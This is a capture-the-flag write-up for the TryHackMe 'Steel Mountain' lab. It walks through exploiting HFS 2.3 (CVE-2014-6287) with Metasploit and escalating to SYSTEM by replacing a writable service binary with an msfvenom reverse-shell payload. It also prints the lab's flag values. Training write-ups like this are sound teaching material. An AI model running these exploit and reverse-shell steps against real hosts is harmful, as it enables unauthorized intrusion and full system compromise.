# Steel Mountain — TryHackMe

## Info

| Field      | Details                              |
|------------|--------------------------------------|
| Platform   | TryHackMe                            |
| Difficulty | Easy                                 |
| OS         | Windows Server 2012 R2               |
| Topics     | HFS, CVE-2014-6287, PowerUp, Unquoted Service Path, Service Binary Replacement |

---

## Summary

Steel Mountain is a Windows machine running an outdated HttpFileServer (HFS 2.3) vulnerable to remote code execution. Initial access is gained via CVE-2014-6287. Privilege escalation is achieved through a misconfigured service binary — the user bill has write permissions over the AdvancedSystemCareService9 executable which runs as SYSTEM, allowing us to replace it with a malicious payload.

---

## Reconnaissance

### Full Port Scan

```
nmap -sS -p- -T4 <target-ip>
```

**Open ports:** 80, 135, 139, 445, 3389, 5985, 8080, 47001, 49152-49208

### Service Detection

```
nmap -sV -sC -p 80,135,139,445,3389,5985,8080,47001 <target-ip>
```

Key findings:

- **Port 80** — Microsoft IIS 8.5
- **Port 8080** — HttpFileServer (HFS) 2.3 — the primary target
- **Port 3389** — RDP, hostname `steelmountain`
- **Port 5985/47001** — WinRM, useful if credentials are found
- **Port 445** — SMB, Windows Server 2012 R2, signing disabled

The most interesting service is **HFS 2.3 on port 8080**. Browsing to `http://<target-ip>:8080` confirms the server information panel showing "HttpFileServer 2.3".

---

## Vulnerability Research

Searching for `HFS 2.3 exploit` and `HttpFileServer 2.3 vulnerability` reveals **CVE-2014-6287** — a Remote Code Execution vulnerability caused by a failure to properly handle null bytes in search queries. This allows an unauthenticated attacker to execute arbitrary commands on the server.

Key references:
- **CVE**: CVE-2014-6287
- **Exploit-DB**: #34926
- **Metasploit module**: `exploit/windows/http/rejetto_hfs_exec`

---

## Exploitation

### Running the Exploit

```
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <target-ip>
set RPORT 8080
set LHOST <tun0-ip>
run
```

Note: RPORT must be set to 8080 — the default is 80 which will fail. LHOST must be the tun0 VPN interface IP.

Result:

```
[*] Meterpreter session 1 opened
```

### System Information

```
sysinfo
```

```
Computer        : STEELMOUNTAIN
OS              : Windows Server 2012 R2 (6.3 Build 9600)
Architecture    : x64
Meterpreter     : x86/windows
```

```
getuid
```

```
Server username: STEELMOUNTAIN\bill
```

We have a shell as `bill` — a low privileged user. Note the architecture mismatch: the system is x64 but the Meterpreter session is x86 due to the payload used. This can cause issues with some post-exploitation modules.

### User Flag

```
shell
cd C:\Users\bill\Desktop
type user.txt
```

```
b04763b6fcf51fcd7c13abc7db4fd365
```

---

## Privilege Escalation

### Enumeration with local_exploit_suggester

```
run post/multi/recon/local_exploit_suggester
```

The suggester found several UAC bypass and persistence modules but no direct privilege escalation kernel exploits. This means the system is likely patched at the kernel level. The next step is to look for **misconfigurations** — specifically misconfigured Windows services.

### PowerUp Enumeration

PowerUp is a PowerShell script from PowerSploit that checks for common Windows privilege escalation misconfigurations including unquoted service paths, modifiable service binaries, and weak registry permissions.

Upload PowerUp to the target:

```
upload PowerUp.ps1
shell
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```

PowerUp identified multiple vulnerable services. The most useful is **AdvancedSystemCareService9** because:

- `StartName: LocalSystem` — runs as SYSTEM
- `CanRestart: True` — we can restart it without rebooting
- `ModifiableFileIdentityReference: STEELMOUNTAIN\bill` — bill has write permissions on the executable
- `Check: Modifiable Service Files` — we can replace the binary directly

The other vulnerable services (IObitUnSvr, LiveUpdateSvc) have `CanRestart: False`, making them less useful without a system reboot.

### Creating the Malicious Payload

On the Kali machine, generate a reverse shell executable with the same name as the service binary:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<tun0-ip> LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```

### Replacing the Service Binary

The service must be stopped first — otherwise the file is locked and cannot be overwritten:

```
shell
sc stop AdvancedSystemCareService9
exit
upload ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

### Getting SYSTEM

Set up a listener on the Kali machine:

```
nc -lvnp 4443
```

Restart the service to trigger the malicious binary:

```
shell
sc start AdvancedSystemCareService9
```

The service starts our payload as SYSTEM, giving a reverse shell:

```
whoami
nt authority\system
```

### Root Flag

```
cd C:\Users\Administrator\Desktop
type root.txt
```

```
9af5f314f57607c00fd09803a587db80
```

---

## What Failed / Dead Ends

- The exploit initially failed because RPORT was left at the default value of 80. HFS runs on port 8080 — always check which port a service is running on before launching an exploit.
- The first upload of ASCService.exe failed with "file is being used by another process" — the service must be stopped before the binary can be replaced.
- The local_exploit_suggester found no kernel exploits, which directed the approach toward service misconfiguration enumeration with PowerUp.

---

## Key Takeaways

- When nmap reveals a specific application version on a non-standard port, always search for known CVEs for that exact version.
- When kernel exploits are unavailable, shift focus to misconfiguration — PowerUp is the standard tool for Windows service enumeration.
- `CanRestart: True` is critical for service binary replacement attacks — without it, the exploit requires a system reboot to trigger.
- Always stop a service before replacing its binary — Windows locks files that are in use.
- The x86/x64 architecture mismatch between the Meterpreter session and the OS can cause issues with some post-exploitation modules. Consider migrating to a native x64 process when possible.
